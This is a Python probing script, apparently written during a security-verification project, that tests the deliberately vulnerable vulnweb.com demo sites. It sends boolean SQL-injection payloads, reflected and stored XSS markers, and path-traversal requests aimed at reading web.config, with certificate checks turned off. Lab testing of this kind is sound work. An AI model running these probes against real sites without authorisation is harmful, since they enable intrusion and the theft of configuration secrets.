#!/usr/bin/env python3
"""IV-13 Phase 4c: testasp/testaspnet refinement.
testasp: what does the 500 body actually say (SQL error?); cleaner boolean SQLi
differential on showforum.asp?id; tfSearch plain reflection.
testaspnet: ReadNews NewsAd traversal content-diff; stored-XSS attempt via comment POST.
stdlib only."""
import json, os, re, time, ssl, urllib.request, urllib.parse, urllib.error
from html.parser import HTMLParser

OUT = '/home/z/my-project/scripts/iv_out'
UA = 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36 IV13-IndependentVerifier/1.0'
CTX = ssl._create_unverified_context()
MARK = 'zxK1mQ7v'

class NoRedirect(urllib.request.HTTPRedirectHandler):
    def redirect_request(self, req, fp, code, msg, headers, newurl):
        return None

def fetch(url, data=None, timeout=25):
    hdrs = {'User-Agent': UA, 'Accept': 'text/html,*/*;q=0.8'}
    if data is not None:
        hdrs['Content-Type'] = 'application/x-www-form-urlencoded'
        data = urllib.parse.urlencode(data).encode()
    req = urllib.request.Request(url, data=data, headers=hdrs,
                                 method='POST' if data is not None else 'GET')
    op = urllib.request.build_opener(NoRedirect, urllib.request.HTTPSHandler(context=CTX))
    try:
        r = op.open(req, timeout=timeout)
        return r.status, r.read().decode('utf-8', 'replace')
    except urllib.error.HTTPError as e:
        return e.code, e.read().decode('utf-8', 'replace')
    except Exception as e:
        return None, repr(e)

class FormParser(HTMLParser):
    def __init__(self):
        super().__init__()
        self.forms = []
        self.cur = None
    def handle_starttag(self, tag, attrs):
        a = dict(attrs)
        if tag == 'form':
            self.cur = {'action': a.get('action'), 'method': (a.get('method') or 'GET').upper(), 'fields': []}
        elif self.cur is not None and tag in ('input', 'textarea', 'select', 'button'):
            self.cur['fields'].append({'tag': tag, 'type': a.get('type'), 'name': a.get('name'),
                                       'value': (a.get('value') or '')[:120], 'id': a.get('id')})
    def handle_endtag(self, tag):
        if tag == 'form' and self.cur:
            self.forms.append(self.cur)
            self.cur = None

results = {'testasp': {}, 'testaspnet': {}}
B1 = 'http://testasp.vulnweb.com'
print('=' * 72)
print('testasp: showforum.asp?id 500-body + boolean differential')

for q, label in [('id=0', 'base'), ('id=0%27', 'quote'), ('id=0+AND+1%3D1', 'and-true'),
                 ('id=0+AND+1%3D2', 'and-false'), ('id=0+OR+1%3D1', 'or-true'),
                 ('id=1+AND+1%3D1', 'id1-true'), ('id=1+AND+1%3D2', 'id1-false'),
                 ('id=99999', 'nonexistent')]:
    st, body = fetch(B1 + '/showforum.asp?' + q)
    err = None
    if isinstance(body, str):
        m = re.search(r'(error \'800|Microsoft \[[^\]]*\]|ODBC|OLE DB|SQL|exception|Syntax)[^<\n]{0,140}', body, re.I)
        if m:
            err = m.group(0)[:170]
    results['testasp'][label] = {'q': q, 'status': st, 'len': len(body), 'err': err,
                                 'body_head': body[:150].replace('\n', ' ') if st == 500 else None}
    print('%-12s %s len=%-6d err=%s' % (label, st, len(body), (err or '')[:80]), flush=True)
    if st == 500 and 'quote' in label:
        print('  500-BODY:', body[:400].replace('\n', ' | ')[:400])
    time.sleep(0.4)

print()
print('testasp: Search.asp tfSearch reflection (plain + tag)')
for val, label in [(MARK, 'plain'), ('<b>%s</b>' % MARK, 'tag'), (MARK + "'", 'plain-quote')]:
    st, body = fetch(B1 + '/Search.asp?' + urllib.parse.urlencode({'tfSearch': val}))
    refl = val in body if isinstance(body, str) else False
    esc = val.replace('<', '&lt;').replace('>', '&gt;') in body if isinstance(body, str) and '<' in val else False
    i = body.find(MARK) if isinstance(body, str) else -1
    ctx = body[max(0, i - 70):i + 90].replace('\n', ' ') if i >= 0 else ''
    results['testasp']['search_' + label] = {'status': st, 'len': len(body) if isinstance(body, str) else 0,
                                             'raw': refl, 'escaped': esc, 'context': ctx[:200]}
    print('tfSearch %-12s %s len=%-6d raw=%s esc=%s ctx=%s' % (label, st,
          len(body) if isinstance(body, str) else 0, refl, esc, ctx[:80]), flush=True)
    time.sleep(0.4)

B2 = 'http://testaspnet.vulnweb.com'
print()
print('=' * 72)
print('testaspnet: ReadNews NewsAd traversal content-diff')
st_a, base_body = fetch(B2 + '/ReadNews.aspx?' + urllib.parse.urlencode({'id': '0', 'NewsAd': 'ads/def.html'}))
st_b, trav_body = fetch(B2 + '/ReadNews.aspx?' + urllib.parse.urlencode({'id': '0', 'NewsAd': 'ads/../../../web.config'}))
st_c, trav2 = fetch(B2 + '/ReadNews.aspx?' + urllib.parse.urlencode({'id': '0', 'NewsAd': 'ads/..\\..\\..\\web.config'}))
print('base=%s/%d  trav-fwd=%s/%d  trav-back=%s/%d' % (st_a, len(base_body), st_b, len(trav_body), st_c, len(trav2)))
# find first divergence base vs trav
if isinstance(trav_body, str):
    for i in range(min(len(base_body), len(trav_body))):
        if base_body[i] != trav_body[i]:
            print('first-diff at %d: base=%r trav=%r' % (i, base_body[i-40:i+60], trav_body[i-40:i+60]))
            break
    results['testaspnet']['readnews_trav'] = {'base': [st_a, len(base_body)], 'fwd': [st_b, len(trav_body)],
                                              'back': [st_c, len(trav2)],
                                              'diff_region': trav_body[max(0, i - 40):i + 200] if len(trav_body) != len(base_body) else None}

print()
print('testaspnet: stored-XSS attempt via comment POST (benign marker)')
st0, cbody = fetch(B2 + '/Comments.aspx?id=0')
if st0 == 200:
    fp = FormParser()
    fp.feed(cbody)
    cf = None
    for f in fp.forms:
        if f['method'] == 'POST' and any(x.get('name') == 'tbComment' for x in f['fields']):
            cf = f
            break
    if cf:
        fields = {x['name']: (x.get('value') or '') for x in cf['fields'] if x.get('name')}
        fields['tbComment'] = 'IV13 marker <u>%s</u> verification' % MARK
        fields['btnSend'] = [x.get('value') or 'Send' for x in cf['fields'] if x.get('name') == 'btnSend'][0]
        action = cf['action'] or '/Comments.aspx?id=0'
        if not action.startswith('http'):
            action = B2 + '/' + action
        stp, pbody = fetch(action, data=fields)
        print('comment POST -> %s len=%d' % (stp, len(pbody)))
        if stp == 500:
            m = re.search(r'potentially dangerous[^<\n]{0,120}', pbody)
            print('  500 reason:', m.group(0) if m else pbody[:200].replace('\n', ' '))
        # reload and search for our marker
        time.sleep(1)
        st1, rbody = fetch(B2 + '/Comments.aspx?id=0')
        raw = '<u>%s</u>' % MARK in rbody
        esc_ = '&lt;u&gt;%s&lt;/u&gt;' % MARK in rbody
        plain = MARK in rbody
        print('after reload: raw-markup=%s escaped=%s plain-string=%s (status %s len %d)' % (raw, esc_, plain, st1, len(rbody)))
        results['testaspnet']['comment_xss'] = {'post_status': stp, 'reload_status': st1,
                                                'raw_markup': raw, 'escaped': esc_, 'plain': plain}
    else:
        print('no comment form with tbComment found')
        results['testaspnet']['comment_xss'] = {'error': 'form not found'}

with open(os.path.join(OUT, 'vulnweb_probes3.json'), 'w') as f:
    json.dump(results, f, indent=1, ensure_ascii=False)
print('\nsaved -> scripts/iv_out/vulnweb_probes3.json')
